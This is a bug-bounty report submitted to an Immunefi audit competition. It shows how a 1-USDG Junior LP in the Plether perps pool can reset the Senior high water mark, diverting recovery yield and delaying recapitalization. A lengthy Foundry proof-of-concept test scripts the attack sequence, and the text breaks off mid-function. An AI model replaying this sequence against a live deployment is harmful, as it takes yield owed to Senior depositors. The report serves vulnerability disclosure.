# \#99150 [SC-High] Public Junior epoch diverts Senior recovery yield and delays recapitalization

**Submitted on Nov 12th 2026 at 06:00:19 UTC by @k42 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99150
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Theft of unclaimed yield

## Description

A Junior LP with 1 USDG can settle a public redemption epoch after ordinary loss and honest owner recapitalization to overwrite surviving Senior high water mark. Later trading revenue that should restore Senior value instead accrues to Junior; a matched Foundry test pays 17 micro USDG of that revenue to attacker while Senior receives 4.449798 USDG less from same later trade. A second test shows 1,858.103318 USDG of honest owner recapitalization becomes temporarily unavailable to Senior for at least one hour.

## Vulnerability Details

`CfdEngine.recapitalizePool` transfers owner USDG into Pool and records pending recapitalization. During `HousePool._reconcile`, `HousePoolPendingPreviewLib.applyClaimantRecapitalizationIntent` handles a zero principal state with surviving Senior shares by setting `seniorHighWaterMark = max(recapitalizationTargetAssets, amount)`. It does not preserve existing high water mark. A public Junior redemption epoch can therefore repeat this bootstrap branch after an earlier recapitalization and lower Senior recovery priority without any Senior share burn, Pool cash movement, or trader claim change.

```solidity
if (state.waterfall.seniorPrincipal == 0 && state.waterfall.juniorPrincipal == 0) {
    state.waterfall.seniorPrincipal += remaining;
    state.waterfall.seniorHighWaterMark =
        recapitalizationTargetAssets > remaining ? recapitalizationTargetAssets : remaining;
    remaining = 0;
}
```

The PoC uses release Senior limits of 40,000,000 USDG and 80%. Eve supplies 250,000 USDG Junior, Bob supplies 1 USDG Junior, and Carol supplies 1,000,000 USDG Senior. Valid public orders, oracle updates, and elapsed carry create a 54,070.947411 USDG shortfall between Pool cash and trader claims. Honest owner contributes 100,000 USDG via real `recapitalizePool`. Bob requests Junior redemption, settles its epoch, claims its refund, then requests and settles another epoch. At that second settlement, Senior high water mark falls from 100,000 to 54,070.947411 USDG while Senior shares, Pool cash, and trader claims remain unchanged. Pending trading revenue is zero at this point.

A matched snapshot compares later behavior at identical time and price. Honest owner contributes another 10,000 USDG in both branches. A separate trader then opens a 10,000 unit LONG with 1,000 USDG margin, holds it for 12 weeks, and closes at the same 1e8 price. The trader incurs ordinary protocol revenue, including realized carry; no later price loss or attacker supplied recapitalization is used. Both branches execute actual Senior and Junior redemption claims. With Bob's extra epoch, Senior restoration priority is reduced, later Pool revenue accrues to Junior, and Bob receives a nonzero USDG transfer. Without it, Bob receives zero and Senior receives the revenue. The test asserts equal terminal trader claims and reconciles Senior receipt shortfall to retained Pool cash plus Bob's transfer.

This is distinct from Cecuro MED-11, which concerns proportional mark reduction on a Senior withdrawal: Bob resets the mark before any Senior redemption. It also differs from MED-24, which concerns zero payout epochs consuming a work cap: one refunded epoch here changes a recovery mark, not queue throughput. MED-12 concerns revenue continuation in the same pending inflow batch: the PoC asserts no pending trading revenue at Bob's mark reset, and the trader generates revenue only later. `ACCOUNTING_SPEC.md` says loss does not reduce Senior high water mark and revenue first restores impaired Senior value.

## Impact Details

**High impact, unclaimed yield diversion.** With the same owner funding and same later same price trade, Carol's Senior receipt falls from 55,933.446420 to 54,070.893304 USDG. Of the 1,862.553116 USDG total Senior receipt difference, 1,858.103318 USDG is the separately measured recapitalization freeze; the additional 4.449798 USDG is displaced later trading revenue. In the attack branch, 4.449785 USDG remains recorded as Junior principal after Bob claims 0.000017 USDG. In control, Junior principal and Bob's receipt are both zero. Bob's claim asserts actual settlement token balance increase, not merely a preview or bookkeeping change. The demonstration is small and does not claim net attacker wealth across the earlier market loss; it proves the listed theft of unclaimed yield impact, not theft of Senior principal.

| Terminal value after same later trade | Control | Bob's extra epoch |
| --- | ---: | ---: |
| Carol Senior USDG receipt | 55,933.446420 | 54,070.893304 |
| Bob Junior USDG receipt | 0 | 0.000017 |
| Remaining Junior principal | 0 | 4.449785 USDG |
| Trader claims | Equal in both branches | Equal in both branches |

**Medium impact, temporary fund freeze.** Without the later trade, another matched test shows honest 10,000 USDG recapitalization leaves 1,858.105178 USDG unassigned instead of restoring Senior. Carol immediately claims 1,858.103318 USDG less. Active 80% Senior share cap rejects owner's direct Senior assignment. Owner can assign value to new Junior shares for Carol, but redemption reverts until one hour cooldown; actual rescue claim of 1,858.091651 USDG occurs 7,200 seconds after control's immediate Senior claim. Bob receives zero in this branch. The missing amount is recoverable with owner intervention; no permanent loss is claimed.

## References

- [Competition scope and High yield impact](https://immunefi.com/audit-competition/plether/scope/)
- [Competition information and runnable PoC requirement](https://immunefi.com/audit-competition/plether/information/)
- [Owner recapitalization](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L627-L658)
- [Public LP settlement](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L794-L820)
- [Reconciliation](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1555-L1599)
- [High water mark overwrite](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L103-L136)
- [Revenue restoration waterfall](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol#L133-L159)
- [Owner assignment and Senior cap](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L660-L703)
- [Junior cooldown and redemption](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L606-L632)
- [Cecuro prior audit](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-ai-audit-report-2026-10-26.pdf)
- [Accounting specification](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L329-L340)


## Proof of Concept

## Proof of Concept

At frozen commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`, save the inline code below and run from `packages/perps`:

Both tests pass. The first proves the one hour fund freeze and owner rescue. The second proves later same price trading revenue is misrouted into Junior, then actually paid to Bob. Test token and Pyth update transport are deterministic out of scope mocks; in scope source is unchanged. Decisive output:

```text
[PASS] test_OneDollarJuniorAttackerCanStrandOwnerRecap()
[PASS] test_OneDollarJuniorAttackerReceivesSeniorRecoveryYield()
control_senior_revenue_receipt_usdg_6dec: 55933446420
attack_senior_revenue_receipt_usdg_6dec: 54070893304
control_attacker_revenue_receipt_usdg_6dec: 0
attack_attacker_revenue_receipt_usdg_6dec: 17
attack_junior_revenue_principal_usdg_6dec: 4449785
carol_rescue_delay_seconds: 7200
Suite result: ok. 2 passed; 0 failed; 0 skipped
```

Full standalone Foundry test:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";
import {CfdEngine} from "@plether/perps/CfdEngine.sol";
import {CfdEngineAccountLens} from "@plether/perps/CfdEngineAccountLens.sol";
import {CfdEngineAdmin} from "@plether/perps/CfdEngineAdmin.sol";
import {CfdEngineLens} from "@plether/perps/CfdEngineLens.sol";
import {CfdEnginePlanner} from "@plether/perps/CfdEnginePlanner.sol";
import {CfdEngineProtocolLens} from "@plether/perps/CfdEngineProtocolLens.sol";
import {CfdEngineSettlementSidecar} from "@plether/perps/CfdEngineSettlementSidecar.sol";
import {CfdOrderPolicyEvaluator} from "@plether/perps/CfdOrderPolicyEvaluator.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {HousePool} from "@plether/perps/HousePool.sol";
import {HousePoolRedemptionMathSidecar} from "@plether/perps/HousePoolRedemptionMathSidecar.sol";
import {MarginClearinghouse} from "@plether/perps/MarginClearinghouse.sol";
import {OrderLifecycleBook} from "@plether/perps/OrderLifecycleBook.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderRouterAdmin} from "@plether/perps/OrderRouterAdmin.sol";
import {OrderRouterExecutionSidecar} from "@plether/perps/OrderRouterExecutionSidecar.sol";
import {OrderRouterLiquidationBatchSidecar} from "@plether/perps/OrderRouterLiquidationBatchSidecar.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {PerpsPublicLens} from "@plether/perps/PerpsPublicLens.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {TerminalNavBookV2} from "@plether/perps/TerminalNavBookV2.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {IOrderRouterAccounting} from "@plether/perps/interfaces/IOrderRouterAccounting.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {MockToken} from "@plether/test-utils/MockToken.sol";
import {Test} from "forge-std/Test.sol";

/// @dev Perps-only, freely mintable six-decimal collateral fixture.
contract MockSettlementToken is MockToken {

    constructor() MockToken("Settlement Token", "SETTLEMENT", 6) {}

}

abstract contract BasePerpTest is Test {

    MockSettlementToken settlementToken;
    CfdEngine engine;
    TerminalNavBookV2 terminalNavBook;
    CfdEngineAdmin engineAdmin;
    CfdEngineAccountLens engineAccountLens;
    CfdEngineLens engineLens;
    CfdEngineProtocolLens engineProtocolLens;
    HousePool pool;
    HousePoolRedemptionMathSidecar housePoolRedemptionMathSidecar;
    MarginClearinghouse clearinghouse;
    TrancheVault seniorVault;
    TrancheVault juniorVault;
    OrderRouter router;
    CfdOrderPolicyEvaluator policyEvaluator;
    OrderRouterExecutionSidecar orderExecutionSidecar;
    OrderRouterAdmin routerAdmin;
    PletherOracle pletherOracle;
    PerpsPublicLens publicLens;
    MockPyth baseMockPyth;

    /// @dev Monday 2024-03-04 10:00 UTC. Avoids FAD window.
    uint256 constant SETUP_TIMESTAMP = 1_709_532_000;
    uint256 constant CAP_PRICE = 2e8;
    uint256 constant FROZEN_CLOSE_SPREAD_BPS = 50;
    uint256 internal constant TEST_MAX_SENIOR_EXPOSURE_ASSETS = 40_000_000e6;
    uint256 internal constant TEST_MAX_SENIOR_SHARE_BPS = 8000;
    address internal constant PROTOCOL_TREASURY_ACCOUNT = address(0xFEE50001);

    receive() external payable {}

    function setUp() public virtual {
        settlementToken = new MockSettlementToken();
        clearinghouse = new MarginClearinghouse(address(settlementToken));

        engine = _deployEngine(_riskParams());
        _syncEngineAdmin();
        terminalNavBook = new TerminalNavBookV2(address(engine), uint32(CAP_PRICE));
        engine.setTerminalNavBook(address(terminalNavBook));
        engineAccountLens = new CfdEngineAccountLens(address(engine));
        engineLens = new CfdEngineLens(address(engine));
        engineProtocolLens = new CfdEngineProtocolLens(address(engine));
        housePoolRedemptionMathSidecar = new HousePoolRedemptionMathSidecar();
        pool = new HousePool(address(settlementToken), address(engine), address(housePoolRedemptionMathSidecar));
        baseMockPyth = new MockPyth();
        baseMockPyth.setSynchronizeLegacyUniquePrices(true);
        bytes32[] memory baseFeedIds = _basePythFeedIds();
        uint256[] memory initialRaw = _releaseRawPrices(1e8);
        for (uint256 i; i < baseFeedIds.length; ++i) {
            baseMockPyth.setPrice(
                baseFeedIds[i], SafeCast.toInt64(SafeCast.toInt256(initialRaw[i])), int32(-8), SETUP_TIMESTAMP
            );
        }

        seniorVault = new TrancheVault(
            IERC20(address(settlementToken)), address(pool), true, "Plether Senior LP", "seniorAssets", 0, address(0)
        );
        juniorVault = new TrancheVault(
            IERC20(address(settlementToken)), address(pool), false, "Plether Junior LP", "juniorAssets", 0, address(0)
        );

        pool.setSeniorVault(address(seniorVault));
        pool.setJuniorVault(address(juniorVault));
        engine.setPool(address(pool));

        pletherOracle = new PletherOracle(
            address(engine),
            address(pool),
            address(baseMockPyth),
            baseFeedIds,
            _basePythWeights(),
            _basePythBasePrices(),
            _basePythInversions()
        );
        router = _deployOrderRouter(address(engine), address(engineLens), address(pool), address(pletherOracle));
        _syncRouterAdmin();
        engine.setOrderRouter(address(router));
        publicLens = new PerpsPublicLens(address(engineAccountLens), address(engine), address(router), address(pool));

        _bypassAllTimelocks();

        uint256 juniorSeed = _initialJuniorSeedDeposit();
        if (juniorSeed > 0) {
            settlementToken.mint(address(this), juniorSeed);
            settlementToken.approve(address(pool), juniorSeed);
            pool.initializeSeedPosition(false, juniorSeed, _juniorSeedReceiver());
        }

        uint256 seniorSeed = _initialSeniorSeedDeposit();
        if (seniorSeed > 0) {
            settlementToken.mint(address(this), seniorSeed);
            settlementToken.approve(address(pool), seniorSeed);
            pool.initializeSeedPosition(true, seniorSeed, _seniorSeedReceiver());
        }

        if (_autoActivateTrading() && pool.isSeedLifecycleComplete()) {
            pool.activateTrading();
        }

        uint256 junior = _initialJuniorDeposit();
        if (junior > 0) {
            _fundJunior(address(this), junior);
        }

        uint256 senior = _initialSeniorDeposit();
        if (senior > 0) {
            _fundSenior(address(this), senior);
        }
    }

    function _bypassAllTimelocks() internal {
        clearinghouse.setEngine(address(engine));

        IHousePool.PoolConfig memory config = _currentPoolConfig();
        config.maxSeniorExposureAssets = TEST_MAX_SENIOR_EXPOSURE_ASSETS;
        config.maxSeniorShareBps = TEST_MAX_SENIOR_SHARE_BPS;
        pool.proposePoolConfig(config);
        vm.warp(pool.poolConfigActivationTime());
        pool.finalizePoolConfig();

        vm.warp(SETUP_TIMESTAMP);
    }

    // --- Virtual hooks ---

    function _riskParams() internal pure virtual returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 100,
            initMarginBps: ((100) * 15) / 10,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1 * 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure virtual returns (uint256) {
        return 1_000_000 * 1e6;
    }

    function _initialSeniorDeposit() internal pure virtual returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure virtual returns (uint256) {
        return 1000e6;
    }

    function _initialSeniorSeedDeposit() internal pure virtual returns (uint256) {
        return 1000e6;
    }

    function _juniorSeedReceiver() internal view virtual returns (address) {
        return address(this);
    }

    function _autoActivateTrading() internal pure virtual returns (bool) {
        return true;
    }

    function _seniorSeedReceiver() internal view virtual returns (address) {
        return address(this);
    }

    function _basePythFeedIds() internal pure returns (bytes32[] memory feedIds) {
        feedIds = new bytes32[](6);
        feedIds[0] = 0xa995d00bb36a63cef7fd2c287dc105fc8f3d93779f062f09551b0af3e81ec30b;
        feedIds[1] = 0xef2c98c804ba503c6a707e38be4dfbb16683775f195b091252bf24693042fd52;
        feedIds[2] = 0x84c2dde9633d93d1bcad84e7dc41c9d56578b7ec52fabedc1f335d673df0a7c1;
        feedIds[3] = 0x3112b03a41c910ed446852aacf67118cb1bec67b2cd0b9a214c58cc0eaa2ecca;
        feedIds[4] = 0x8ccb376aa871517e807358d4e3cf0bc7fe4950474dbe6c9ffc21ef64e43fc676;
        feedIds[5] = 0x0b1e3297e69f162877b577b0d6a47a0d63b2392bc8499e6540da4187a63e28f8;
    }

    function _basePythWeights() internal pure returns (uint256[] memory weights) {
        weights = new uint256[](6);
        weights[0] = 576e15;
        weights[1] = 136e15;
        weights[2] = 119e15;
        weights[3] = 91e15;
        weights[4] = 42e15;
        weights[5] = 36e15;
    }

    function _basePythBasePrices() internal pure returns (uint256[] memory basePrices) {
        basePrices = new uint256[](6);
        basePrices[0] = 117_500_000;
        basePrices[1] = 638_000;
        basePrices[2] = 134_480_000;
        basePrices[3] = 72_880_000;
        basePrices[4] = 10_860_000;
        basePrices[5] = 126_100_000;
    }

    function _basePythInversions() internal pure returns (bool[] memory inversions) {
        inversions = new bool[](6);
        inversions[1] = true;
        inversions[3] = true;
        inversions[4] = true;
        inversions[5] = true;
    }

    function _releaseRawPrices(
        uint256 mark
    ) internal pure returns (uint256[] memory rawPrices) {
        uint256[] memory bases = _basePythBasePrices();
        bool[] memory inversions = _basePythInversions();
        rawPrices = new uint256[](bases.length);
        for (uint256 i; i < bases.length; ++i) {
            uint256 normalized = bases[i] * mark / 1e8;
            rawPrices[i] = inversions[i] ? (1e16 + normalized / 2) / normalized : normalized;
        }
    }

    function _mockPythUpdateData() internal returns (bytes[] memory updateData) {
        return _mockPythUpdateData(1e8);
    }

    function _mockPythUpdateData(
        uint256 price
    ) internal returns (bytes[] memory updateData) {
        // The optimizer treats block fields as constant within a transaction, even across cheatcodes.
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        uint256 publishTime = _mockHistoricalPublishTime();
        bytes32[] memory feedIds = _basePythFeedIds();
        uint256[] memory rawPrices = _releaseRawPrices(price);
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](feedIds.length);
        for (uint256 i; i < feedIds.length; ++i) {
            updates[i] = MockPyth.FeedUpdate({
                id: feedIds[i],
                price: MockPyth.MockPrice({
                    price: SafeCast.toInt64(SafeCast.toInt256(rawPrices[i])),
                    conf: SafeCast.toUint64(rawPrices[i] / 10_000),
                    expo: -8,
                    publishTime: publishTime,
                    prevPublishTime: publishTime == 0 ? 0 : publishTime - 1
                })
            });
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(updates);
    }

    function _mockPythCurrentUpdateData(
        uint256 mark
    ) internal returns (bytes[] memory updateData) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        uint256 publishTime = block.timestamp;
        bytes32[] memory feedIds = _basePythFeedIds();
        uint256[] memory rawPrices = _releaseRawPrices(mark);
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](feedIds.length);
        for (uint256 i; i < feedIds.length; ++i) {
            updates[i] = MockPyth.FeedUpdate({
                id: feedIds[i],
                price: MockPyth.MockPrice({
                    price: SafeCast.toInt64(SafeCast.toInt256(rawPrices[i])),
                    conf: SafeCast.toUint64(rawPrices[i] / 10_000),
                    expo: -8,
                    publishTime: publishTime,
                    prevPublishTime: publishTime - 1
                })
            });
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(updates);
    }

    function _mockHistoricalPublishTime() internal view returns (uint256 publishTime) {
        publishTime = vm.getBlockTimestamp();
        uint64 nextOrderId = router.nextExecuteId();
        if (nextOrderId == 0) {
            return publishTime;
        }

        (IOrderRouterAccounting.PendingOrderView memory pending,) = router.getPendingOrderView(nextOrderId);
        uint256 candidate = uint256(pending.commitTime) + 1;
        if (pending.orderId != 0 && candidate <= publishTime) {
            publishTime = candidate;
        }
    }

    // --- Asynchronous LP funding helpers ---

    function _fundJunior(
        address lp,
        uint256 amount
    ) internal {
        _fundTrancheAsync(juniorVault, lp, amount);
    }

    function _fundSenior(
        address lp,
        uint256 amount
    ) internal {
        _fundTrancheAsync(seniorVault, lp, amount);
    }

    function _fundTrancheAsync(
        TrancheVault vault,
        address lp,
        uint256 amount
    ) internal returns (uint256 shares) {
        settlementToken.mint(lp, amount);
        vm.startPrank(lp);
        settlementToken.approve(address(vault), amount);
        uint256 requestId = vault.requestDeposit(amount, lp, lp);
        vm.stopPrank();

        uint256 activationTime = vault.depositEpochStart(requestId);
        if (block.timestamp < activationTime) {
            vm.warp(activationTime);
        }
        uint256 markPrice = engine.lastMarkPrice();
        bytes[] memory updateData = _mockPythCurrentUpdateData(markPrice == 0 ? 1e8 : markPrice);
        vm.prank(address(0xE0E));
        router.updateMarkPrice(updateData);
        vm.prank(lp);
        pool.settleLpEpoch(0, 0);

        uint256 claimableAssets = vault.claimableDepositRequest(requestId, lp);
        assertEq(claimableAssets, amount, "async tranche funding must finalize the requested asset basis");
        vm.prank(lp);
        shares = vault.claimDeposit(requestId, claimableAssets, lp, lp);
        assertGt(shares, 0, "async tranche funding must mint claimable shares");
    }

    /// @dev Unit and economics tests install marks directly through the configured Router address. Route settlement
    ///      through the production authorization split without forcing every test to construct Pyth update blobs.
    ///      No-position and frozen-mode calls intentionally exercise the cached-mark liveness path.

    function _fundTrader(
        address trader,
        uint256 amount
    ) internal {
        address account = trader;
        settlementToken.mint(trader, amount);
        vm.startPrank(trader);
        settlementToken.approve(address(clearinghouse), amount);
        clearinghouse.deposit(account, amount);
        vm.stopPrank();
    }

    function _currentPoolConfig() internal view returns (IHousePool.PoolConfig memory config) {
        config = IHousePool.PoolConfig({
            seniorRateBps: pool.seniorRateBps(),
            markStalenessLimit: pool.markStalenessLimit(),
            seniorFrozenLpFeeBps: pool.seniorFrozenLpFeeBps(),
            juniorFrozenLpFeeBps: pool.juniorFrozenLpFeeBps(),
            maxSeniorExposureAssets: pool.maxSeniorExposureAssets(),
            maxSeniorShareBps: pool.maxSeniorShareBps()
        });
    }

    function _setSeniorCapacity(
        uint256 maxSeniorExposureAssets,
        uint256 maxSeniorShareBps
    ) internal {
        IHousePool.PoolConfig memory config = _currentPoolConfig();
        config.maxSeniorExposureAssets = maxSeniorExposureAssets;
        config.maxSeniorShareBps = maxSeniorShareBps;
        pool.proposePoolConfig(config);
        vm.warp(pool.poolConfigActivationTime());
        pool.finalizePoolConfig();
    }

    // --- Trading helpers ---

    // --- Governance helpers ---

    function _syncEngineAdmin() internal {
        engineAdmin = CfdEngineAdmin(engine.admin());
    }

    function _deployEngine(
        CfdTypes.RiskParams memory riskParams_
    ) internal returns (CfdEngine deployedEngine) {
        deployedEngine = new CfdEngine(
            address(settlementToken), address(clearinghouse), CAP_PRICE, riskParams_, _frozenCloseSpreadBps()
        );
        CfdEnginePlanner planner = new CfdEnginePlanner();
        CfdEngineSettlementSidecar settlement = new CfdEngineSettlementSidecar(address(deployedEngine));
        CfdEngineAdmin adminModule = new CfdEngineAdmin(address(deployedEngine), address(this));
        deployedEngine.setDependencies(address(planner), address(settlement), address(adminModule));
        deployedEngine.setProtocolTreasury(PROTOCOL_TREASURY_ACCOUNT);
    }

    /// @dev Deploys the unmodified production bounded-order router.
    function _deployOrderRouter(
        address engine_,
        address engineLens_,
        address pool_,
        address oracle_
    ) internal virtual returns (OrderRouter deployedRouter) {
        policyEvaluator = new CfdOrderPolicyEvaluator();
        orderExecutionSidecar = new OrderRouterExecutionSidecar();
        address predictedRouter = vm.computeCreateAddress(address(this), vm.getNonce(address(this)) + 2);
        OrderLifecycleBook lifecycleBook =
            new OrderLifecycleBook(predictedRouter, engine_, address(clearinghouse), pool_);
        OrderRouterLiquidationBatchSidecar keeperSidecar = new OrderRouterLiquidationBatchSidecar(predictedRouter);
        deployedRouter = new OrderRouter(
            engine_,
            engineLens_,
            pool_,
            oracle_,
            address(keeperSidecar),
            address(policyEvaluator),
            address(orderExecutionSidecar),
            address(lifecycleBook)
        );
        assertEq(address(deployedRouter), predictedRouter);
    }

    function _frozenCloseSpreadBps() internal pure virtual returns (uint256) {
        return FROZEN_CLOSE_SPREAD_BPS;
    }

    function _syncRouterAdmin() internal {
        routerAdmin = OrderRouterAdmin(router.admin());
    }

    // --- Time helpers ---

    /// @dev Verifies that the account-local V2 terminal curve is the exact committed image of live Engine state.

    /// @dev Verifies the authenticated Engine snapshot against the exact aggregate book and live protocol state.


}

contract M01PublicRecapFreezeTest is BasePerpTest {

    address internal constant BOB = address(0x222);
    address internal constant CAROL = address(0x333);
    uint256 internal constant OWNER_RECAP = 100_000e6;

    address private constant DAVE = address(0xD00D);
    address private constant EVE = address(0xE0E0);
    address private constant REVENUE_TRADER = address(0xD4D4);

    struct Trade {
        address account;
        CfdTypes.Side side;
        uint256 size;
        uint256 margin;
        uint256 price;
        bool close;
    }

    struct ControlResult {
        uint256 seniorPrincipal;
        uint256 juniorPrincipal;
        uint256 bobReceipt;
        uint256 carolReceipt;
        uint256 poolCash;
        uint256 exitTime;
    }

    function setUp() public override {
        super.setUp();
        _setSeniorCapacity(40_000_000e6, 8000);
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory params) {
        params = super._riskParams();
        params.vpiFactor = 0.01e18;
        params.maxSkewRatio = 0.4e18;
        params.maintMarginBps = 10;
        params.initMarginBps = 20;
        params.minBountyAssets = 1e6;
    }

    function test_OneDollarJuniorAttackerCanStrandOwnerRecap() public {
        (, uint256 deficit) = _establishSmallAttackerLossAndRecap();
        _probeExtraRecapFromState(deficit, 10_000e6);
    }

    function test_OneDollarJuniorAttackerReceivesSeniorRecoveryYield() public {
        (, uint256 deficit) = _establishSmallAttackerLossAndRecap();
        uint256 secondId = _prepareJuniorEpoch(deficit);
        _fundTrader(REVENUE_TRADER, 100_000e6);
        uint256 checkpoint = vm.snapshotState();
        uint256 finalTime = block.timestamp + 3 hours;

        vm.warp(finalTime);
        _recapitalize(10_000e6);
        vm.prank(BOB);
        pool.settleLpEpoch(0, 0);
        vm.prank(BOB);
        juniorVault.claimRedeemRefund(secondId, BOB, BOB);
        _normalRevenueTrade();
        (uint256 controlCarol, uint256 controlBob) = _claimSeniorThenJunior();
        uint256 controlPoolCash = pool.rawAssets();
        uint256 controlTraderClaims = engine.totalTraderClaimBalanceAssets();
        assertEq(pool.juniorPrincipal(), 0, "control routes recovery revenue to Senior");

        assertTrue(vm.revertToState(checkpoint));
        vm.prank(BOB);
        pool.settleLpEpoch(0, 0);
        vm.prank(BOB);
        juniorVault.claimRedeemRefund(secondId, BOB, BOB);
        vm.warp(juniorVault.lastDepositTime(BOB) + juniorVault.DEPOSIT_COOLDOWN());
        uint256 bobShares = juniorVault.balanceOf(BOB);
        vm.prank(BOB);
        uint256 thirdId = juniorVault.requestRedeem(bobShares, BOB, BOB);
        vm.warp(pool.lpEpochStart(thirdId));
        vm.warp(finalTime);
        _recapitalize(10_000e6);
        vm.prank(BOB);
        pool.settleLpEpoch(0, 0);
        vm.prank(BOB);
        juniorVault.claimRedeemRefund(thirdId, BOB, BOB);
        assertEq(pool.juniorPrincipal(), 0, "no Junior principal before later trade");
        _normalRevenueTrade();
        (uint256 attackCarol, uint256 attackBob) = _claimSeniorThenJunior();

        emit log_named_uint("control_senior_revenue_receipt_usdg_6dec", controlCarol);
        emit log_named_uint("attack_senior_revenue_receipt_usdg_6dec", attackCarol);
        emit log_named_uint("control_attacker_revenue_receipt_usdg_6dec", controlBob);
        emit log_named_uint("attack_attacker_revenue_receipt_usdg_6dec", attackBob);
        emit log_named_uint("attack_junior_revenue_principal_usdg_6dec", pool.juniorPrincipal());
        assertEq(controlBob, 0, "control pays no Junior yield");
        assertGt(attackBob, 0, "attacker receives Senior recovery yield");
        assertGt(pool.juniorPrincipal(), 0, "remaining misrouted yield belongs to Junior");
        assertGt(controlCarol, attackCarol, "Senior receives less with same later trade");
        assertEq(engine.totalTraderClaimBalanceAssets(), controlTraderClaims, "trader claims unchanged");
        assertEq(
            controlCarol - attackCarol,
            pool.rawAssets() - controlPoolCash + attackBob - controlBob,
            "Senior shortfall equals retained cash plus attacker receipt"
        );
    }

    function _establishSmallAttackerLossAndRecap() internal returns (uint256 claims, uint256 deficit) {
        address longTrader = address(0xA11CE);
        address shortTrader = address(0xB0B);
        _fundJunior(EVE, 250_000e6);
        _fundJunior(BOB, 1e6);
        _fundSenior(CAROL, 1_000_000e6);
        _fundTrader(longTrader, 100_000e6);
        _fundTrader(shortTrader, 1_200_000e6);

        _tradePublic(
            Trade({
                account: longTrader,
                side: CfdTypes.Side.LONG,
                size: 500_000e18,
                margin: 50_000e6,
                price: 1e8,
                close: false
            })
        );
        _tradePublic(
            Trade({
                account: shortTrader,
                side: CfdTypes.Side.SHORT,
                size: 999_000e18,
                margin: 900_000e6,
                price: 1e8,
                close: false
            })
        );
        _tradePublic(
            Trade({
                account: longTrader,
                side: CfdTypes.Side.LONG,
                size: 700_000e18,
                margin: 2000e6,
                price: 1e8,
                close: false
            })
        );
        _tradePublic(
            Trade({
                account: shortTrader,
                side: CfdTypes.Side.SHORT,
                size: 200_000e18,
                margin: 2000e6,
                price: 1e8,
                close: false
            })
        );
        vm.warp(block.timestamp + 12 weeks);
        _tradePublic(
            Trade({
                account: longTrader,
                side: CfdTypes.Side.LONG,
                size: 1_200_000e18,
                margin: 0,
                price: 45_000_000,
                close: true
            })
        );
        vm.warp(block.timestamp + 12 weeks);
        _tradePublic(
            Trade({
                account: shortTrader,
                side: CfdTypes.Side.SHORT,
                size: 1_199_000e18,
                margin: 0,
                price: 155_000_000,
                close: true
            })
        );

        claims = engine.totalTraderClaimBalanceAssets();
        uint256 cash = pool.rawAssets();
        assertGt(claims, cash, "real claims exceed pool cash");

        deficit = claims - cash;
        emit log_named_uint("deficit_usdg_6dec", deficit);
        uint256 recapitalization = OWNER_RECAP;
        settlementToken.mint(address(this), recapitalization);
        settlementToken.approve(address(engine), recapitalization);
        engine.recapitalizePool(recapitalization);
        if (engine.degradedMode()) {
            engine.clearDegradedMode();
        }
    }

    function _prepareJuniorEpoch(
        uint256 deficit
    ) internal returns (uint256 secondId) {
        vm.warp(juniorVault.lastDepositTime(BOB) + juniorVault.DEPOSIT_COOLDOWN());
        uint256 bobShares = juniorVault.balanceOf(BOB);
        vm.prank(BOB);
